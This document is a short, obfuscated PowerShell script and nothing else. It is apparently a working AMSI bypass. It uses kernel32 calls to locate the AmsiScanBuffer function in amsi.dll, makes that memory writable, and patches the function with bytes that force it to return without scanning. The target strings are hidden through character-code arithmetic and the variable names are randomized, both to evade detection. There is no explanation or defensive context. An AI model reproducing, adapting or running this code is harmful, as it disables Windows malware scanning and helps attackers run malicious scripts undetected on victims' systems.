$E7t8SkCH6m = @"
using System;
using System.Runtime.InteropServices;
public class E7t8SkCH6m {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr sFNjoD1ad7, string TLiV_);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr kA1nKbk_GEi, UIntPtr HRJjkK7, uint nl4HaKBdZEBf5, out uint U7KtXD0itlEP3G);
}
"@

Add-Type $E7t8SkCH6m

$RXNNiFRCmK = [E7t8SkCH6m]::LoadLibrary("$([CHAr]([bYTe]0x61)+[CHAR](109+56-56)+[cHAR]([BYte]0x73)+[cHar]([BYTe]0x69)+[CHAr](46+9-9)+[ChAr]([BYTe]0x64)+[ChaR](101+7)+[CHar]([BytE]0x6c))")
$LgwgtR9Jg6oZR = [E7t8SkCH6m]::GetProcAddress($RXNNiFRCmK, "$([cHar]([bYte]0x41)+[Char]([BytE]0x6d)+[char]([BYTe]0x73)+[CHar](105*30/30)+[Char](83*68/68)+[char]([byTE]0x63)+[cHar]([byTe]0x61)+[CHaR]([byte]0x6e)+[cHAR](66)+[chAR]([Byte]0x75)+[cHAR]([BytE]0x66)+[chAr](102)+[ChaR]([BytE]0x65)+[ChAr](114))")
$p = 0
[E7t8SkCH6m]::VirtualProtect($LgwgtR9Jg6oZR, [uint32]5, 0x40, [ref]$p)
$ofiUi_ffiq = "0xB8"
$VMk6oXXHtlQsZI4uC4hT = "0x57"
$nq1VvoImewsG9JiE9y = "0x00"
$wPp3B = "0x07"
$cfPmIHtMZpOG = "0x80"
$AmLVL = "0xC3"
$uSgD = [Byte[]] ($ofiUi_ffiq,$VMk6oXXHtlQsZI4uC4hT,$nq1VvoImewsG9JiE9y,$wPp3B,+$cfPmIHtMZpOG,+$AmLVL)
[System.Runtime.InteropServices.Marshal]::Copy($uSgD, 0, $LgwgtR9Jg6oZR, 6)